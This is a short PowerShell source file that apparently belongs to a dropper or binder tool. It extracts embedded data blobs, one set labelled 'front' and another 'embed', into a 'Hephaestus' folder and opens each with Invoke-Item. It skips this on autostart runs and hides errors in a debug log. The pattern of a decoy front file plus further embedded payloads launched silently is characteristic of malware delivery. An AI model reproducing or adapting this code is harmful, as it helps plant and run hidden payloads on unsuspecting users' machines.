. ./utils.ps1
. ./consts.ps1


function EmbeddingName {
    param (
        [string]$name
    )
    $folder = Get-HephaestusFolder
    return Join-Path -Path $folder -ChildPath $name
}

function DoInternalEmbeddings {
    param (
        [array]$names, [array]$datas
    )

    $auto = Test-Autostart;
    if ($auto -eq $true)
    {
        return
    }
    try 
    {
        for ($i = 0; $i -lt $names.Length; $i++) {
            $name = $names[$i]
            $data = $datas[$i]
            $file = EmbeddingName($name)
            ExtractEmbedding -inContent $data -outFile $file
            Invoke-Item $file
        }
    }
    catch {
    writedbg "An error occurred (DoFront): $_"
    }
}


function DoFront {
    DoInternalEmbeddings -names $xfront_name -datas $xfront
}

function DoEmbeddings {
    DoInternalEmbeddings -names $xembed_name -datas $xembed
}